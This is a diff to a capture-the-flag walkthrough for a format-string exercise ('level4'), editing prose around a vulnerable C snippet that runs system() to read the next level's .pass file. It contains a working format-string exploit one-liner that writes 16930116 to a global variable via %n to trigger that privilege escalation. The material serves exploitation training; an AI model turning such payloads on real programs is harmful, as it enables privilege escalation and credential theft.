@@ -47,11 +47,11 @@ Useful documentation:
 
 Similary to [level3](../level3/walkthrough.md), the program shows a non-standard libc `printf()` usage that violates the specifications of the related [man-page](https://man7.org/linux/man-pages/man3/printf.3.html).
 
-We will assume you have read the previous [walkthrough.md](../level3/walkthrough.md) omiting some information in the following explanations.
+In the following explanations, we will assume you have read the previous [walkthrough.md](../level3/walkthrough.md).
 
 ## Vulnerability analysis
 
-Static analysis of [source.c](./source.c) shows the following section
+Static analysis of [source.c](./source.c) shows the following section.
 ```c
 if (m == 16930116) {
     system("/bin/cat /home/user/level5/.pass");
@@ -60,8 +60,7 @@ if (m == 16930116) {
 
 ### Intent
 
-We wish to identify the variable `m` and set its value to 16930116 *(0x1025544)*, satisfying the privilege escalation condition.  
-While we could also hijack control flow by overwriting the return address, that approach requires significantly more effort.
+We wish to identify the variable `m` and set its value to 16930116 *(0x1025544)*, satisfying the privilege escalation condition.
 
 ### Static Storage
 
@@ -140,3 +139,5 @@ In the same fashion as the previous exercice, we assign the value to the target 
 # We write a total of 16930116 characters (4 + 16930112) to assign it to target address.
 $ printf "%b\n" "\020\230\004\010%16930112c%12\$n" | ./level4
 ```
+
+And there it is.
